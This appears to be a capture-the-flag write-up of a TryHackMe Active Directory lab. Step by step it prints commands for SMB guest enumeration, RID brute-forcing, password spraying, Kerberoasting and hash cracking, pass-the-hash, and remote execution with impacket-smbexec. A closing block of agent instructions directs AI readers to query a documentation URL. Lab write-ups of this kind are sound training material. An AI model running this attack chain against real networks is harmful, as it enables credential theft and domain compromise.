# Soupedecode 01

{% embed url="<https://tryhackme.com/room/soupedecode01>" %}

The following post by 0xb0b is licensed under [CC BY 4.0<img src="https://mirrors.creativecommons.org/presskit/icons/cc.svg?ref=chooser-v1" alt="" data-size="line"><img src="https://mirrors.creativecommons.org/presskit/icons/by.svg?ref=chooser-v1" alt="" data-size="line">](http://creativecommons.org/licenses/by/4.0/?ref=chooser-v1)

***

## Recon

We start with a Nmap scan, which revealed multiple services typical of an Active Directory environment, including DNS (53), Kerberos (88, 464), SMB (445), LDAP (389, 636), Global Catalog services (3268, 3269), and MSRPC/NetBIOS (135, 139). Additional services such as Remote Desktop Protocol (3389), Active Directory Web Services (9389), and a range of high-numbered ephemeral ports (49664–49793) commonly used for DCOM and RPC communication were also observed.

```
nmap -p- soupdecode01.thm -Pn
```

<figure><img src="/files/siJXf4RgAA8jIBIQ9P6K" alt=""><figcaption></figcaption></figure>

We perform a default script scan and version scan on the ports and can determine the domain name and FQDN, which we add to our `/etc/hosts` file:

{% code overflow="wrap" %}

```
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49664,49666,49675,49711,49793 soupdecode01.thm -Pn
```

{% endcode %}

<figure><img src="/files/fKfUDTGBvsiICMrFTnFy" alt=""><figcaption></figcaption></figure>

```
dc01.soupdecode.local, soupdecode.local
```

## Access To SMB as Guest

Since we have SMB available, we start enumerating it with NetExec (formerly CrackMapExec). It is an enumeration tool used for assessing and interacting with SMB and other network services. We use the built-in `guest` account and an empty password for an initial enumeration.

Initial connectivity was verified with the guest account without a password.

```
nxc smb soupdecode.local -u guest -p ''
```

<figure><img src="/files/BWGw65v3D5fYtErMvWeB" alt=""><figcaption></figcaption></figure>

We are able to connect as guest. We then list the available shares for the guest account. This confirmed that the `IPC$` share was readable

```
nxc smb soupdecode.local -u guest -p '' --shares
```

<figure><img src="/files/3QnoZWhSXyMbnA1vzNZa" alt=""><figcaption></figcaption></figure>

To further enumerate domain users, we perform a RID brute-force, since the `IPC$` share is readable.

```
nxc smb soupdecode.local -u guest -p '' --rid
```

<figure><img src="/files/mQ71RlM9zTONjh9weKim" alt=""><figcaption></figcaption></figure>

We craft a users list with the follwing command. With this user list we could try kerberoasting or bruteforcing the accounts.

{% code overflow="wrap" %}

```
grep 'SOUPEDECODE\\' rid_brute.txt | cut -d':' -f2- | sed -E 's/.*SOUPEDECODE\\(.*) \(SidType.*/\1/' | grep -v '\$' > usernames.txt
```

{% endcode %}

<figure><img src="/files/BtmntVKneBYpVqx1g4nC" alt=""><figcaption></figcaption></figure>

## Access To SMB as ybob317

First, we attempting to enumerate SMB shares on the `soupdecode.local` domain using the `nxc smb` tool with a list of usernames (and the same list as passwords), skipping brute-force (will only try credentials as exact username-password pairs from the list) and continuing enumeration even if valid credentials are found. We are able to spot valid credentials for `ybob317`.

{% code overflow="wrap" %}

```
nxc smb soupdecode.local -u usernames.txt -p usernames.txt --no-brute --continue-on-success
```

{% endcode %}

<figure><img src="/files/f2meSeJ1ykx89LHmBXId" alt=""><figcaption></figcaption></figure>

We try to enumerate the shares and see we are able to read the Users directory.

```
nxc smb soupdecode.local -u 'ybob317' -p 'REDACTED' --shares
```

<figure><img src="/files/JtZU4nQYFY6U2O1eI0dA" alt=""><figcaption></figcaption></figure>

We connect to the share...

```
smbclient //soupdecode.local/Users -U ybob317
```

<figure><img src="/files/BRnWZDkbHNNxRbs1GVpx" alt=""><figcaption></figcaption></figure>

... and are able to spot the `users.txt` in `\ybob317\Desktop`.

<figure><img src="/files/pLIlp0rMj2tbGUsN7pmc" alt=""><figcaption></figcaption></figure>

## Kerberoasting - Access as file\_svc

With the valid credentials we could try some Kerberoasting. We are able to retrieve some hashes.

{% code overflow="wrap" %}

```
impacket-GetUserSPNs soupedecode.local/ybob317:REDACTED-dc-ip 10.10.205.165 -request -output hashes.txt
```

{% endcode %}

<figure><img src="/files/CIMomQSy9ReXVo7Q5ODT" alt=""><figcaption></figcaption></figure>

Which of the hash from `file_svc` is crackable.

{% code overflow="wrap" %}

```
hashcat -a0 -m13100 hashes.txt /usr/share/wordlists/rockyou.txt --show
```

{% endcode %}

<figure><img src="/files/RqGVlh9KxIr0d5BKZ1Gp" alt=""><figcaption></figcaption></figure>

We use the credentials of `file_svc` to enumerate the shares, and see that we are now able to read the `backup` share.

```
nxc smb soupdecode.local -u 'file_svc' -p 'REDACTED' --shares
```

<figure><img src="/files/gnJSbswru21vbYXqzqFR" alt=""><figcaption></figcaption></figure>

## Pass-the-Hash - Access as FileServer$

Next, we retrieve the content of the `backup` share.

```
smbclient //soupdecode.local/backup -U file_svc
```

<figure><img src="/files/9nQCKZ5g8Qqp4F9v8oM6" alt=""><figcaption></figcaption></figure>

This share contains some NTLM hashes.

<figure><img src="/files/P0nifPvsQDfX9wLTG5ri" alt=""><figcaption></figcaption></figure>

First, we retrive the users from the list.

```
cat backup_extract.txt | cut -d ':' -f 1 > extracted_users.txt
```

<figure><img src="/files/aYSkjSMaybEeGk3TXJVb" alt=""><figcaption></figcaption></figure>

To extract just the NTLM hashes (the fourth field) from our `backup_extract.txt` file using `cut`, we can use the follwing command:

```
cut -d: -f4 backup_extract.txt > ntlm-hashes.txt
```

We pass the hashes and find a valid hash for `FileServer$`.

```
nxc smb soupdecode.local -u extracted_users.txt -H ntlm-hashes.txt --no-brute
```

<figure><img src="/files/mnFUpvOfYFIanF926ogX" alt=""><figcaption></figcaption></figure>

Next, we use Smbexec to execute remote commands over SMB. We have sufficient access rights to access `C:Users\Adminstrator\Desktop`, where we find the root flag `root.txt`.

```
impacket-smbexec 'FileServer$'@soupdecode.local -hashes ':REDACTED'
```

<figure><img src="/files/OOE91dQiANB2emUApsWJ" alt=""><figcaption></figcaption></figure>


---

# Agent Instructions: Querying This Documentation

If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.

Perform an HTTP GET request on the current page URL with the `ask` query parameter:

```
GET https://0xb0b.gitbook.io/writeups/tryhackme/2025/soupedecode-01.md?ask=<question>
```

The question should be specific, self-contained, and written in natural language.
The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.

Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
